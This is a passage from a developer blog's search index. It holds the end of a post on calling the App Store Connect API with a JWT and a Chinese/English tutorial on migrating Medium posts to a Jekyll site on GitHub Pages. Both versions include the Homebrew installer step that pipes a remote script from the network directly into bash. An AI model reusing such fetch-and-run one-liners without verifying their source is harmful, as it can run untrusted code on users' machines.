following:4oxjoi8j69rHQ58KqPtrFABBWHX2QH7iGFyjkc5q6AJZrKA3AcZcCFoFMTMHpM.pojTEWQufMTvfZUW1nKz66p3emsy2v5QseJX5UJmfRjpxfjgELUGJraEVtX7tVg6aicmJT96q0snP034MhfgoZAB46MGdtC6kv2Vj6VeL2geuXG87Ys6ADijhT7mfHUcbmLPJPNZNuMttcc.fuFAJZNijRHnCA2BRqq7RZEJBB7TLsm1n4WM1cW0yo67KZp-Bnwx9y45cmH82QPAgKcG-y1UhRUrxybi5b9iNNReady to try it out?With the token, we can now access the App Store Connect API!curl -H 'Authorization: Bearer JWT' \"https://api.appstoreconnect.apple.com/v1/apps/APPID/customerReviews\" APPID can be obtained from the App Store Connect backend:Or from the App Store page: https://apps.apple.com/tw/app/pinkoi/id557252416 APPID = 557252416 Success! 🚀 We can now retrieve app reviews using this method, with complete data that can be fully automated without manual maintenance (while JWT may expire, the Private Key does not, allowing us to generate JWT for each request using the Private Key). For other filtering parameters and operations, please refer to the official documentation. ⚠️ You can only access review data for apps you have permission to manage⚠️Complete Ruby Test ProjectI created a Ruby file that implements the above process, which you can clone and fill in your details to test.First time setup:bundle installTo start using:bundle exec ruby jwt.rbNext StepsSimilarly, we can access and manage via the API (API Overview): [New] Customer reviews [New] Subscriptions [New] In-App Purchases [New] Xcode Cloud Workflows And Builds [Updated] Improving your App’s Performance TestFlight Users And Roles App Clips App Management App Metadata Pricing And Availability Provisioning Sales and TrendsIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 2,031 Total Views Last Statistics Date: 2025-08-15 | 1,852 Views on Medium." }, { "title": "無痛轉移 Medium 到自架網站", "url": "/posts/zrealm-dev/%E7%84%A1%E7%97%9B%E8%BD%89%E7%A7%BB-medium-%E5%88%B0%E8%87%AA%E6%9E%B6%E7%B6%B2%E7%AB%99-a0c08d579ab1/", "categories": "ZRealm Dev.", "tags": "ios-app-development, jekyll, github-actions, medium, self-hosted", "date": "2022-07-17 00:00:47 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.無痛轉移 Medium 到自架網站將 Medium 內容搬遷至 Github Pages (with Jekyll/Chirpy)zhgchg.li背景經營 Medium 的第四年，已累積超過 65 篇文章，將近 1000+ ...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.無痛轉移 Medium 到自架網站將 Medium 內容搬遷至 Github Pages (with Jekyll/Chirpy)zhgchg.li背景經營 Medium 的第四年，已累積超過 65 篇文章，將近 1000+ 小時的時間心血；當初會選擇 Medium 的原因是簡單方便，可以很好的把心思放在撰寫文章上，不需要去管其他的事；在此之前曾經嘗試過自架 Wordpress，但都把心思放在弄環境、樣式、Plguin 這些事情上，感覺怎麼調整都不滿意，調整好後又發現載入太慢、閱讀體驗不佳、後台撰寫文章介面也不夠人性化，然後就沒怎麼在更新了。隨著在 Medium 撰寫的文章越來越多、累積了一些流量與追蹤者後，又開始想自己掌握著這些成果，而不是被第三方平台掌控 (e.g Medium 關站心血全沒)，所以從前年開始就一直在尋覓第二備份網站，會持續經營 Medium 但也會同步把內容發佈到自己能掌控的網站上；當時找到的解決方案是 — Google Site 但老實說只能當成個人「入口網站」使用，文章撰寫界面功能有限，無法真的把所有文章心血搬過去。最終還是走回自架的的道路，不同的是採用的並非動態網站(e.g. wordpress)，而是靜態網站；相較之下能支援的功能較少，但是我要的就是文章撰寫功能跟簡潔流暢可客製化的瀏覽體驗，其他都不需要！靜態網站的工作流程是：在本地使用 Markdown 格式撰寫好文章，然後將其透過靜態網站引擎轉換為 靜態網頁 上傳到伺服器，即完成；靜態網頁，瀏覽體驗快速！使用 Markdown 格式寫作，可以讓文章兼容更多不同平台；如不習慣，也可以找線上或線下的 Markdown 撰寫工具，體驗就跟直接在 Medium 撰寫一樣！。綜合以上，這個方案可以達成我希望流暢的瀏覽體驗及方便的撰寫界面兩個維度的需求。成果zhgchg.li 支援客製化顯示樣式 支援客製化頁面調整 (e.g. 插入廣告、js widget) 支援自訂頁面 支援自訂域名 靜態化頁面載入快速、瀏覽體驗佳 使用 Git 版本控制，文章所有的歷史版本都能保留恢復 全自動定時自動同步 Medium 文章到網站2025/01/18 Update 🎉🎉🎉 請參考快速使用 Medium to Jekyll 設定教學 請參考快速使用 Medium to Jekyll 設定教學 請參考快速使用 Medium to Jekyll 設定教學環境及工具 環境語言 ：Ruby 依賴管理工具 ： RubyGems.org 、 Bundler 靜態網站引擎 ： Jekyll (Based on Ruby) 文章格式 ：Markdown 伺服器 ： Github Page (免費、無限流量/容量 靜態網站伺服器) CI/CD ： Github Action (免費 2,000 mins+/月) Medium 文章轉換 Markdown 工具 ： ZMediumToMarkdown (Based on Ruby) 版本控制 ： Git (可選) Git GUI ： Git Fork (可選) 網域服務 ： Namecheap安裝 Ruby這邊只以我的環境為例，其他作業系統版本請 Google 如何安裝 Ruby 。 macOS Monterey 12.1 rbenv ruby 2.6.5安裝 Brew/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"在 Terminal 輸入以上指令安裝 Brew。安裝 rbenvbrew install rbenv ruby-buildMacOS 雖自帶 Ruby 但建議使用 rbenv 安裝另一個 Ruby 與系統自帶的區隔開來，在 Terminal 輸入以上指令安裝 rbenv。rbenv init在 Terminal 輸入以上指令初始化 rbenv 關閉＆重新打開 Terminal。在 Terminal 輸入 rbenv 檢查是否安裝成功！成功！使用 rbenv 安裝 Rubyrbenv install 2.6.5在 Terminal 輸入以上指令安裝 Ruby 2.6.5 版本。rbenv global 2.6.5在 Terminal 輸入以上指令將 Terminal 所使用的 Ruby 版本從系統自帶的切換到 rbenv 的版本。在 Terminal 輸入 rbenv versions 查看當前設定：在 Terminal 輸入 ruby -v 查看當前 Ruby、 gem -v 查看當前 RubyGems 狀況： *Ruby 安裝完後理應也安裝好 RubyGems 了。成功！安裝 Jekyll &amp; Bundler &amp; ZMediumToMarkdowngem install jekyll bundler ZMediumToMarkdown在 Terminal 輸入以上指令安裝 Jekyll &amp; Bundler &amp; ZMediumToMarkdown。完成！從模版建立 Jekyll Blog預設的 Jekyll Blog 樣式非常簡潔，我們可以從以下網站找到自己喜歡的樣式並套用： GitHub.com #jekyll-theme repos jamstackthemes.dev jekyllthemes.org jekyllthemes.io jekyll-themes.com安裝方式一般使用 gem-based themes ，也有的 Repo 提供 Fork 方式安裝；甚至是提供直接一鍵安裝方式；總之每個模板的安裝方式可能有所不同，請參閱模板的教學使用。 另外要注意，因我們要部署到 Github Pages 上，依據官方文件所說並非所有模板都能適用。Chirpy 模版這邊就以我 Blog 採用的模版 Chirpy 為示範，此模版提供最傻瓜的一鍵安裝方式，可以直接使用。 其他模版比較少有提供類似的一鍵安裝，在不熟悉 Jeklly、Github Pages 的情況下先使用此模版是比較好入門的方式；日後有機會再更新文章講其他的模版安裝方式。 另外在 Github 上找可以直接 Fork 的模版也可以(e.g. al-folio )直接使用，如果都不是，是需要自己手動安裝的模版就要自行研究如何設定 Github Pages 部署，這邊我稍微研究了一下沒成功，待日後有結果再回來文章補充分享。從 Git Template 建立 Git Repohttps://github.com/cotes2020/chirpy-starter/generate Repository name： Github帳號/組織名稱.github.io ( 務必使用這個格式 ) 務必選擇「Public」公開 Repo點擊「Create repository from template」完成 Repo 建立。Git Clone 專案git clone git@github.com:zhgchgli0718/zhgchgli0718.github.io.gitgit clone 剛剛建立的 Repo。執行 bundle 安裝依賴：執行 bundle lock — add-platform x86_64-linux 鎖定版本修改網站設定打開 _config.yml 設定檔案進行設定：# The Site Configuration# Import the themetheme: jekyll-theme-chirpy# Change the following value to '/PROJECT_NAME' ONLY IF your site type is GitHub Pages Project sites# and doesn't have a custom domain.# baseurl: ''# The language of the webpage › http://www.lingoes.net/en/translator/langcode.htm# If it has the same name as one of the files in folder `_data/locales`, the layout language will also be changed,# otherwise, the layout language will use the default value of 'en'.lang: en# Additional parameters for datetime localization, optional. › https://github.com/iamkun/dayjs/tree/dev/src/localeprefer_datetime_locale:# Change to your timezone › http://www.timezoneconverter.com/cgi-bin/findzone/findzonetimezone:# jekyll-seo-tag settings › https://github.com/jekyll/jekyll-seo-tag/blob/master/docs/usage.md# ↓ --------------------------title: ZhgChgLi # the main titletagline: Live a life you will remember. # it will display as the sub-titledescription: &gt;- # used by seo meta and the atom feed ZhgChgLi iOS Developer 求知若渴 教學相長 更愛電影/美劇/西音/運動/生活# fill in the protocol &amp; hostname for your site, e.g., 'https://username.github.io'url: 'https://zhgchg.li'github: username: ZhgChgLi # change to your github usernametwitter: username: zhgchgli # change to your twitter usernamesocial: # Change to your full name. # It will be displayed as the default author of the posts and the copyright owner in the Footer name: ZhgChgLi email: zhgchgli@gmail.com # change to your email address links: - https://medium.com/@zhgchgli - https://github.com/ZhgChgLi - https://www.linkedin.com/in/zhgchgligoogle_site_verification: # fill in to your verification string# ↑ --------------------------# The end of `jekyll-seo-tag` settingsgoogle_analytics: id: G-6WZJENT8WR # fill in your Google Analytics ID # Google Analytics pageviews report settings pv: proxy_endpoint: # fill in the Google Analytics superProxy endpoint of Google App Engine cache_path: # the local PV cache data, friendly to visitors from GFW region# Prefer color scheme setting.## Note: Keep empty will follow the system prefer color by default,# and there will be a toggle to switch the theme between dark and light# on the bottom left of the sidebar.## Available options:## light - Use the light color scheme# dark - Use the dark color scheme#theme_mode: # [light|dark]# The CDN endpoint for images.# Notice that once it is assigned, the CDN url# will be added to all image (site avatar &amp; posts' images) paths starting with '/'## e.g. 'https://cdn.com'img_cdn:# the avatar on sidebar, support local or CORS resourcesavatar: '/assets/images/zhgchgli.jpg'# boolean type, the global switch for ToC in posts.toc: truecomments: active: disqus # The global switch for posts comments, e.g., 'disqus'. Keep it empty means disable # The active options are as follows: disqus: shortname: zhgchgli # fill with the Disqus shortname. › https://help.disqus.com/en/articles/1717111-what-s-a-shortname # utterances settings › https://utteranc.es/ utterances: repo: # &lt;gh-username&gt;/&lt;repo&gt; issue_term: # &lt; url | pathname | title | ...&gt; # Giscus options › https://giscus.app giscus: repo: # &lt;gh-username&gt;/&lt;repo&gt; repo_id: category: category_id: mapping: # optional, default to 'pathname' input_position: # optional, default to 'bottom' lang: # optional, default to the value of `site.lang`# Self-hosted static assets, optional › https://github.com/cotes2020/chirpy-static-assetsassets: self_host: enabled: # boolean, keep empty means false # specify the Jekyll environment, empty means both # only works if `assets.self_host.enabled` is 'true' env: # [development|production]paginate: 10# ------------ The following options are not recommended to be modified ------------------kramdown: syntax_highlighter: rouge syntax_highlighter_opts: # Rouge Options › https://github.com/jneen/rouge#full-options css_class: highlight # default_lang: console span: line_numbers: false block: line_numbers: true start_line: 1collections: tabs: output: true sort_by: orderdefaults: - scope: path: '' # An empty string here means all files in the project type: posts values: layout: post comments: true # Enable comments in posts. toc: true # Display TOC column in posts. # DO NOT modify the following parameter unless you are confident enough # to update the code of all other post links in this project. permalink: /posts/:title/ - scope: path: _drafts values: comments: false - scope: path: '' type: tabs # see `site.collections` values: layout: page permalink: /:title/ - scope: path: assets/img/favicons values: swcache: true - scope: path: assets/js/dist values: swcache: truesass: style: compressedcompress_html: clippings: all comments: all endings: all profile: false blanklines: false ignore: envs: [development]exclude: - '*.gem' - '*.gemspec' - tools - README.md - LICENSE - gulpfile.js - node_modules - package*.jsonjekyll-archives: enabled: [categories, tags] layouts: category: category tag: tag permalinks: tag: /tags/:name/ category: /categories/:name/請依照註解將設定替換成您的內容。 ⚠️ _config.yml 有調整都需要重新啟動本地網站！才會套用效果預覽網站依賴安裝完成後，可以下 bundle exec jekyll s 啟動本地網站：複製其中的網址 http://127.0.0.1:4000/ 貼到瀏覽器打開本地預覽成功！此 Terminal 開著，本地網站就開著，Terminal 會持續更新網站存取紀錄，方便我們除錯。我們可以再開一個新的 Termnial 做後續的其他操作。Jeklly 目錄結構依照樣板不同可能會有不同的資料夾跟設定檔案，文章目錄在： _posts/ ：文章會放在這個目錄下文章檔案命名規則： YYYY – MM – DD - 文章檔案名稱 .md assets/ ：網站資源目錄，網站用圖片或 文章內的圖片 都要放置於此其他目錄 _incloudes、_layouts、_sites、_tabs… 都可讓你做進階的擴充修改。Jeklly 使用 Liquid 做為頁面模板引擎，頁面模板是類似繼承方式組成：使用者可自由客製化頁面，引擎會先看使用者有沒有建立對應頁面的客製化檔案 -&gt; 如果沒有則看樣板有沒有 -&gt; 如果沒有就用原始的 Jekyll 樣式呈現。所以我們可以很輕易地對任何頁面做客製化，只需要在相對應的目錄建立一樣的檔案名稱即可！建立/編輯文章 我們可以先把 _posts/ 目錄下的範例文章檔案全數刪除。使用 Visual Code (免費) 或 Typora (付費) 建立 Markdown 檔案，這邊以 Visual Code 為例： 文章檔案命名規則： YYYY – MM – DD - 文章檔案名稱 .md 建議以英文為檔案名稱 (SEO 最佳化)，這個名稱就會是網址的路徑文章 內容頂部 Meta ：---layout: posttitle: \"安安\"description: ZhgChgLi 的第一篇文章date: 2022-07-16 10:03:36 +0800categories: Jeklly Lifeauthor: ZhgChgLitags: [ios]--- layout: post title: 文章標題 (og:title) description: 文章描述 (og:description) date: 文章發表時間 (不可以是未來) author: 作者 (meta:author) tags: 標籤 (可多個) categories: 分類 (單個，用空格區分子母分類 Jeklly Life -&gt; Jeklly 目錄下的 Life 目錄)文章內容 ：使用 Markdown 格式撰寫：---layout: posttitle: \"安安\"description: ZhgChgLi 的第一篇文章date: 2022-07-16 10:03:36 +0800categories: Jeklly Lifeauthor: ZhgChgLitags: [ios]---# HiHi!你好啊我是 **ZhgChgLi**圖片：![](/assets/post_images/DSC_2297.jpg){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MDAiIGhlaWdodD0iNTAwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }&gt; _有任何問題及指教歡迎 [與我聯絡](https://www.zhgchg.li/contact) 。_成果： ⚠️ 文章調整不需要重新啟動網站，檔案變更後會直接渲染顯示，如果過一陣子都沒出現修改內容，可能是文章內容格式有誤導致渲染失敗，可回到 Terminal 查看原因。從 Medium 下載文章並轉成 Markdown 放入 Jekyll有了基本的 Jekyll 知識後我們繼續向前邁進，使用 ZMediumToMarkdown 工具將現有在 Medium 網站上的文章下載並轉換成 Markdwon 格式放到我們的 Blog 資料夾中。cd 到 blog 目錄下後，下以下指令將 Medium 上的該使用者所有文章都下載下來：ZMediumToMarkdown -j 你的 Meidum 帳號等待所有文章下載完成。。。 如有遇到任何下載問題、意外出錯歡迎 與我聯絡 ，這個下載器是我撰寫的( 開發心得 )，可以最快速直接地幫你解決問題。下載完成後，回到本地網站就能預覽成果囉。完成！！我們已經無痛地將 Medium 文章導入到 Jekyll 囉！可以檢查一下文章有無跑版、圖片有無缺失，如果有一樣歡迎 回報給我 協助修復。上傳內容到 Repo本地預覽內容沒問題後，我們就要將內容 Push 到 Github Repo 囉。依序使用以下 Git 指令操作：git add .git commit -m \"update post\"git pushPush 完成後回到 Github 上，可以看到 Actions 有 CD 再跑：約等待 5 分鐘…部署完成！首次部署完成設定首次部署完成要更改以下設定：否則前往網站只會出現：--- layout: home # Index page ---「Save」後不會馬上生效，要回到「Actions」頁面再一次重新等待部署。重新部署完成後，就能成功進入網站了：Demo -&gt; zhgchg.li現在你也擁有一個免費的 Jekyll 個人 Blog 囉！！關於部署每次 Push 內容到 Repo 都會觸發重新部署，要等到部署成功，更改才會真正生效。綁定自訂網域如果不喜歡 zhgchgli0718.github.io Github 網址，可以從 Namecheap 購買您喜歡的網域或是使用 Dot.tk 註冊免費 .tk 結尾的網域。購買網域後進到網域後台：加上以下四個 Type A Record 紀錄A Record @ 185.199.108.153A Record @ 185.199.109.153A Record @ 185.199.110.153A Record @ 185.199.111.153網域後台新增好設定後，回到 Github Repo Settings：在 Custom domain 的地方填入你的網域，然後按「Save」。等待 DNS 通了之後，就可以用 zhgchg.li 取代掉原本的 github.io 網址。 ⚠️ DNS 設定至少需要 5 分鐘 ~ 72 小時才會生效，如果一直無法認證過；請稍後再試。雲端、全自動 Medium 同步機制每次有新文章都要用電腦手動跑 ZMediumToMarkdown 然後再 Push 到專案，嫌麻煩嗎？ZMediumToMarkdown 其實還提供貼心的 Github Action 功能 ，可以讓你解放電腦、全自動幫你同步 Medium 文章到你的網站上。前往 Repo 的 Actions 設定：點擊「New workflow」點擊「set up a workflow yourself」 檔案名稱修改為： ZMediumToMarkdown.yml 檔案內容如下：name: ZMediumToMarkdownon: workflow_dispatch: schedule: - cron: \"10 1 15 * *\" # At 01:10 on day-of-month 15.jobs: ZMediumToMarkdown: runs-on: ubuntu-latest steps: - name: ZMediumToMarkdown Automatic Bot uses: ZhgChgLi/ZMediumToMarkdown@main with: command: '-j 你的 Meidum 帳號' cron : 設定執行週期 (每週？每個月？每天？)，這邊是設定每個月 15 號凌晨 1:15 會自動執行 command: 填入你的 Medium 帳號在 -j 後面點擊右上方「Start commit」-&gt;「Commit new file」完成 Github Action 建立。建立完成後回到 Actions 就會出現 ZMediumToMarkdown Action。除了時間到自動執行外還可以依照以下步驟，手動觸發執行：Actions -&gt; ZMediumToMarkdown -&gt; Run workflow -&gt; Run workflow。執行後，ZMediumToMarkdown 就會直接透過 Github Action 的機器跑同步 Medium 文章到 Repo 的腳本：跑完後同樣會觸發重新部署，重新部署完成後到網站就會出現最新的內容了。🚀 完全無需人工操作！也就是說未來你還是可以繼續更新 Medium 文章，腳本都會貼心地自動幫你從雲端同步內容到你自己的網站上！我的 Blog Repo有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,313 Total Views Last Statistics Date: 2025-08-15 | 1,019 Views on Medium." }, { "title": "Seamless Migration from Medium to Self-Hosted Website", "url": "/posts/zrealm-dev/en/seamless-migration-from-medium-to-self-hosted-website-a0c08d579ab1/", "categories": "ZRealm Dev.", "tags": "ios-app-development, jekyll, github-actions, medium, self-hosted", "date": "2022-07-17 00:00:47 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Seamless Migration from Medium to Self-Hosted WebsiteMigrating Medium content to Git...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Seamless Migration from Medium to Self-Hosted WebsiteMigrating Medium content to GitHub Pages (with Jekyll/Chirpy)zhgchg.liBackgroundAfter running my Medium account for four years and accumulating over 65 articles, I realized I had invested nearly 1000 hours into it. I initially chose Medium for its simplicity and convenience, allowing me to focus on writing without worrying about other aspects. Before that, I had tried self-hosting with WordPress, but I found myself spending too much time on environment setup, styling, and plugins. No matter how I adjusted things, I was never satisfied. Once I got everything set up, I discovered slow loading times, poor reading experiences, and an unintuitive backend for writing articles, which led to infrequent updates.As I wrote more articles on Medium and gained some traffic and followers, I began to desire control over my content rather than relying on a third-party platform (e.g., losing all my work if Medium shut down). Therefore, I started looking for a secondary backup site two years ago. I planned to continue using Medium while also publishing content on a site I could control. At that time, I found a solution in Google Sites, but honestly, it was only suitable as a personal “portal” with limited article writing features, making it impossible to transfer all my hard work.Ultimately, I returned to self-hosting, but this time I opted for a static website instead of a dynamic one (e.g., WordPress). While static sites support fewer features, I wanted a writing function and a clean, customizable browsing experience—nothing more!The workflow for a static website is straightforward: write articles locally in Markdown format, then convert them into static web pages using a static site generator and upload them to the server. This results in fast-loading static pages and a great browsing experience!Writing in Markdown format allows for compatibility across various platforms. If you’re not used to it, you can find online or offline Markdown writing tools that provide an experience similar to writing directly on Medium.In summary, this solution meets my needs for a smooth browsing experience and a convenient writing interface.Resultszhgchg.li Supports customizable display styles Allows for custom page adjustments (e.g., inserting ads, JS widgets) Supports custom pages Allows for custom domain names Fast loading of static pages and great browsing experience Uses Git for version control, preserving all historical versions of articles Fully automated synchronization of Medium articles to the website2025/01/18 Update 🎉🎉🎉 Please refer to the quick setup guide for Medium to Jekyll Please refer to the quick setup guide for Medium to Jekyll Please refer to the quick setup guide for Medium to JekyllEnvironment and Tools Programming Language: Ruby Dependency Management Tool: RubyGems.org, Bundler Static Site Generator: Jekyll (Based on Ruby) Article Format: Markdown Server: GitHub Pages (Free, unlimited traffic/storage for static websites) CI/CD: GitHub Actions (Free 2,000 mins+/month) Medium Article to Markdown Conversion Tool: ZMediumToMarkdown (Based on Ruby) Version Control: Git (Optional) Git GUI: Git Fork (Optional) Domain Service: NamecheapInstalling RubyHere’s an example based on my environment; please Google how to install Ruby for other operating systems. macOS Monterey 12.1 rbenv ruby 2.6.5Install Brew/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"Enter the above command in Terminal to install Brew.Install rbenvbrew install rbenv ruby-buildAlthough macOS comes with Ruby, it’s recommended to use rbenv to install a separate version of Ruby. Enter the above command in Terminal to install rbenv.rbenv initEnter the above command in Terminal to initialize rbenv. Close and reopen Terminal.In Terminal, enter rbenv to check if the installation was successful!Success!Use rbenv to Install Rubyrbenv install 2.6.5Enter the above command in Terminal to install Ruby version 2.6.5.rbenv global 2.6.5Enter the above command in Terminal to switch the Ruby version used in Terminal from the system version to the rbenv version.In Terminal, enter rbenv versions to check the current settings:In Terminal, enter ruby -v to check the current Ruby version and gem -v to check the current RubyGems status: *Ruby should also have installed RubyGems by default.Success!Install Jekyll, Bundler, and ZMediumToMarkdowngem install jekyll bundler ZMediumToMarkdownEnter the above command in Terminal to install Jekyll, Bundler, and ZMediumToMarkdown.Done!Create a Jekyll Blog from a TemplateThe default Jekyll Blog style is very simple. You can find a style you like from the following websites and apply it: GitHub.com #jekyll-theme repos jamstackthemes.dev jekyllthemes.org jekyllthemes.io jekyll-themes.comThe installation method generally uses gem-based themes, but some repositories offer installation via Fork or even one-click installation. Each template may have different installation methods, so please refer to the template’s usage instructions. Additionally, please note that since we are deploying to GitHub Pages, not all templates are compatible according to the official documentation.Chirpy TemplateI will demonstrate using the template Chirpy, which provides a very straightforward one-click installation method. Other templates rarely offer similar one-click installations. If you’re unfamiliar with Jekyll or GitHub Pages, starting with this template is a good way to get acquainted. I may update this article later to discuss other template installation methods. You can also find templates on GitHub that can be directly Forked (e.g., al-folio) for immediate use. If none of these options work, you will need to manually install the template and research how to set up GitHub Pages deployment. I’ve done some preliminary research on this but haven’t succeeded yet; I’ll return to this article to share any findings later.Create a Git Repo from the Git Templatehttps://github.com/cotes2020/chirpy-starter/generate Repository name: GithubAccount/OrganizationName.github.io ( Make sure to use this format ) Ensure you select “Public” for the repository.Click “Create repository from template” to complete the repo creation.Git Clone the Projectgit clone git@github.com:zhgchgli0718/zhgchgli0718.github.io.gitClone the repo you just created.Run bundle to install dependencies:Run bundle lock — add-platform x86_64-linux to lock the version:Modify Website SettingsOpen the _config.yml configuration file to make your settings:# The Site Configuration# Import the themetheme: jekyll-theme-chirpy# Change the following value to '/PROJECT_NAME' ONLY IF your site type is GitHub Pages Project sites# and doesn't have a custom domain.# baseurl: ''# The language of the webpage › http://www.lingoes.net/en/translator/langcode.htm# If it has the same name as one of the files in folder `_data/locales`, the layout language will also be changed,# otherwise, the layout language will use the default value of 'en'.lang: en# Additional parameters for datetime localization, optional. › https://github.com/iamkun/dayjs/tree/dev/src/localeprefer_datetime_locale:# Change to your timezone › http://www.timezoneconverter.com/cgi-bin/findzone/findzonetimezone:# jekyll-seo-tag settings › https://github.com/jekyll/jekyll-seo-tag/blob/master/docs/usage.md# ↓ --------------------------title: ZhgChgLi # the main titletagline: Live a life you will remember. # it will display as the sub-titledescription: &gt;- # used by seo meta and the atom feed ZhgChgLi iOS Developer, eager to learn, teaching and learning, loves movies/TV shows/Western music/sports/life# fill in the protocol &amp; hostname for your site, e.g., 'https://username.github.io'url: 'https://zhgchg.li'github: username: ZhgChgLi # change to your github usernametwitter: username: zhgchgli # change to your twitter usernamesocial: # Change to your full name. # It will be displayed as the default author of the posts and the copyright owner in the Footer name: ZhgChgLi email: zhgchgli@gmail.com # change to your email address links: - https://medium.com/@zhgchgli - https://github.com/ZhgChgLi - https://www.linkedin.com/in/zhgchgligoogle_site_verification: # fill in to your verification string# ↑ --------------------------# The end of `jekyll-seo-tag` settingsgoogle_analytics: id: G-6WZJENT8WR # fill in your Google Analytics ID # Google Analytics pageviews report settings pv: proxy_endpoint: # fill in the Google Analytics superProxy endpoint of Google App Engine cache_path: # the local PV cache data, friendly to visitors from GFW region# Prefer color scheme setting.## Note: Keep empty will follow the system prefer color by default,# and there will be a toggle to switch the theme between dark and light# on the bottom left of the sidebar.## Available options:## light - Use the light color scheme# dark - Use the dark color scheme#theme_mode: # [light|dark]# The CDN endpoint for images.# Notice that once it is assigned, the CDN url# will be added to all image (site avatar &amp; posts' images) paths starting with '/'## e.g. 'https://cdn.com'img_cdn:# the avatar on sidebar, support local or CORS resourcesavatar: '/assets/images/zhgchgli.jpg'# boolean type, the global switch for ToC in posts.toc: truecomments: active: disqus # The global switch for posts comments, e.g., 'disqus'. Keep it empty means disable # The active options are as follows: disqus: shortname: zhgchgli # fill with the Disqus shortname. › https://help.disqus.com/en/articles/1717111-what-s-a-shortname # utterances settings › https://utteranc.es/ utterances: repo: # &lt;gh-username&gt;/&lt;repo&gt; issue_term: # &lt; url | pathname | title | ...&gt; # Giscus options › https://giscus.app giscus: repo: # &lt;gh-username&gt;/&lt;repo&gt; repo_id: category: category_id: mapping: # optional, default to 'pathname' input_position: # optional, default to 'bottom' lang: # optional, default to the value of `site.lang`# Self-hosted static assets, optional › https://github.com/cotes2020/chirpy-static-assetsassets: self_host: enabled: # boolean, keep empty means false # specify the Jekyll environment, empty means both # only works if `assets.self_host.enabled` is 'true' env: # [development|production]paginate: 10# ------------ The following options are not recommended to be modified ------------------kramdown: syntax_highlighter: rouge syntax_highlighter_opts: # Rouge Options › https://github.com/jneen/rouge#full-options css_class: highlight # default_lang: console span: line_numbers: false block: line_numbers: true start_line: 1collections: tabs: output: true sort_by: orderdefaults: - scope: path: '' # An empty string here means all files in the project type: posts values: layout: post comments: true # Enable comments in posts. toc: true # Display TOC column in posts. # DO NOT modify the following parameter unless you are confident enough # to update the code of all other post links in this project. permalink: /posts/:title/ - scope: path: _drafts values: comments: false - scope: path: '' type: tabs # see `site.collections` values: layout: page permalink: /:title/ - scope: path: assets/img/favicons values: swcache: true - scope: path: assets/js/dist values: swcache: truesass: style: compressedcompress_html: clippings: all comments: all endings: all profile: false blanklines: false ignore: envs: [development]exclude: - '*.gem' - '*.gemspec' - tools - README.md - LICENSE - gulpfile.js - node_modules - package*.jsonjekyll-archives: enabled: [categories, tags] layouts: category: category tag: tag permalinks: tag: /tags/:name/ category: /categories/:name/Please replace the settings with your content as per the comments. ⚠️ Any adjustments to _config.yml require restarting the local site for the changes to take effect!Preview the WebsiteOnce the dependencies are installed, you can run bundle exec jekyll s to start the local site:Copy the URL http://127.0.0.1:4000/ and paste it into your browser to open it.Local preview successful!Keep this Terminal open, and the local site will remain active. The Terminal will continuously update the site access logs, making it easier for us to debug.We can open another new Terminal for subsequent operations.Jekyll Directory StructureDepending on the template, there may be different folders and configuration files. The article directory is: _posts/: Articles will be placed in this directory.Article file naming convention: YYYY-MM-DD-article-file-name.md assets/: The resource directory for the website, where images for the site or images within articles should be placed.Other directories like _includes, _layouts, _sites, _tabs, etc., allow for advanced customization.Jekyll uses Liquid as its page template engine, where page templates are composed in a manner similar to inheritance:Users can freely customize their pages. The engine first checks if the user has created a corresponding customization file for the page. If not, it checks if a template exists. If neither is available, it will display the original Jekyll style.This means we can easily customize any page by simply creating a file with the same name in the corresponding directory!Creating/Editing Articles We can start by deleting all example article files in the _posts/ directory.Using Visual Studio Code (free) or Typora (paid), we can create Markdown files. Here, we will use Visual Studio Code as an example: Article file naming convention: YYYY-MM-DD-article-file-name.md It is recommended to use English for the file name (for SEO optimization), as this name will be part of the URL path.Article Top Meta:---layout: posttitle: \"Hello\"description: ZhgChgLi's first articledate: 2022-07-16 10:03:36 +0800categories: Jekyll Lifeauthor: ZhgChgLitags: [ios]--- layout: post title: Article title (og:title) description: Article description (og:description) date: Article publication date (cannot be in the future) author: Author (meta:author) tags: Tags (can be multiple) categories: Category (single, use spaces to separate parent and child categories, e.g., Jekyll Life -&gt; Jekyll directory under Life directory)Article Content:Write using Markdown format:---layout: posttitle: \"Hello\"description: ZhgChgLi's first articledate: 2022-07-16 10:03:36 +0800categories: Jekyll Lifeauthor: ZhgChgLitags: [ios]---# HiHi!Hello there!I am **ZhgChgLi**Image:![](/assets/post_images/DSC_2297.jpg){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MDAiIGhlaWdodD0iNTAwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }&gt; _If you have any questions or suggestions, feel free to [contact me](https://www.zhgchg.li/contact)._Result: ⚠️ Article adjustments do not require restarting the website; changes will be rendered immediately. If the modified content does not appear after a while, it may be due to formatting errors in the article content, which can be checked in the Terminal for reasons.Downloading Articles from Medium and Converting to Markdown for JekyllWith a basic understanding of Jekyll, we can move forward by using the ZMediumToMarkdown tool to download existing articles from Medium and convert them into Markdown format to place in our Blog folder.After navigating to the blog directory, run the following command to download all articles from the specified Medium 